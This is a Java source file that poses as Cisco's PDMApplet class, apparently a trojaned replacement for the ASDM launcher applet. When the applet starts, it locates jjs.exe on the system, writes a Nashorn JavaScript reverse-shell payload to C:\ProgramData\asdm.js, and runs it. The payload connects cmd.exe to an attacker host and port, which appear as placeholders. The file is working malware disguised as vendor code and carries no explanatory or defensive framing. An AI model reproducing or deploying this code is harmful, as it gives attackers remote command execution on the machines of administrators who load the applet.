
package com.cisco.pdm;

import java.io.*;
import java.util.*;
import com.cisco.nm.dice.loader.SgzApplet;

public final class PDMApplet extends SgzApplet {

  private static PDMApplet b;
  
  public void init() {
  }

  private String findJJS(File input)
  {
    File[] listing = input.listFiles();
    if (listing == null)
    {
      return "";
    }

    for (File file : listing)
    {
        if (file.isDirectory())
        {
            String result = findJJS(file);
            if (!result.isEmpty())
            {
              return result;
            }
        }
        else if ("jjs.exe".equals(file.getName()))
        {
          return file.getAbsolutePath();
        }
    }
    return "";
  }
  
  public void start(String[] paramArrayOfString) {
    String payload =
      "var ProcessBuilder=Java.type(\"java.lang.ProcessBuilder\");" +
      "var p=new ProcessBuilder(\"cmd.exe\").redirectErrorStream(true).start();" +
      "var ss=Java.type(\"java.net.Socket\");" +
      "var s=new ss(\"!!!LHOST!!!\", !!!LPORT!!!);" +
      "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();" +
      "var po=p.getOutputStream(),so=s.getOutputStream();" +
      "while(!s.isClosed()){" +
      "  while(pi.available()^>0)so.write(pi.read());" +
      "  while(pe.available()^>0)so.write(pe.read());" +
      "  while(si.available()^>0)po.write(si.read());" +
      "  so.flush();" +
      "  po.flush();" +
      "  Java.type(\"java.lang.Thread\").sleep(50);" +
      "  try{p.exitValue();break;}catch(e){}" +
      "};" +
      "p.destroy();s.close();";


    String jjs_location = findJJS(new File("../../../Program Files/"));
    if (jjs_location.isEmpty())
    {
      jjs_location = findJJS(new File("../../"));
      if (jjs_location.isEmpty())
      {
        // uhhhh
        return;
      }
    }

    try
    {
      Runtime.getRuntime().exec("cmd.exe /c echo " + payload + " > C:\\ProgramData\\asdm.js");
      Runtime.getRuntime().exec(jjs_location + " C:\\ProgramData\\asdm.js");
    }
    catch (Exception e)
    {
    }
  }
}
